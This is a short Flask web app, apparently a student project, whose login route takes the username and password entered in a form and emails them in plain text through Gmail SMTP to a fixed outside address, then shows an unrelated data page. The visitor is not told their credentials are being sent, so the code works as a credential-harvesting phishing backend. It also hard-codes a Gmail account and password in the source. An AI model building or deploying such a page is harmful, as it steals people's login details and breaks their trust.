from flask import Flask, render_template, request, redirect, url_for
import yagmail


app = Flask(__name__)

@app.route('/')
def view_homepage():
  return render_template('index.html')
  
@app.route('/about')
def view_aboutpage():
  # return render_template('about.html')
  return redirect(url_for('view_datapage'))
  
@app.route('/login', methods = ['POST', 'GET'])
def view_loginpage():
  if request.method == 'POST':
    user_name = request.form['username_input_box']
    password = request.form['pwd_input_box']
    # print('username: ' + user_name)
    # print('password: '+ password)
    yag = yagmail.SMTP(user='peterpipinstall@gmail.com', password='pipinstall', host='smtp.gmail.com')
    # Adding in the details
    toRec = "gw14galbraithpeter2@glow.ea.glasgow.sch.uk"
    subjectLine = "A test email"
    body = ["username: ", user_name, "\tpassword: ", password]
    # Delivery
    yag.send(to=toRec, subject=subjectLine, contents=body)
    print('code completed')
    # return redirect('/data')
    return render_template('data.html')
  else:
    return render_template('login.html')

@app.route('/data')
def view_datapage():
  return render_template('data.html')
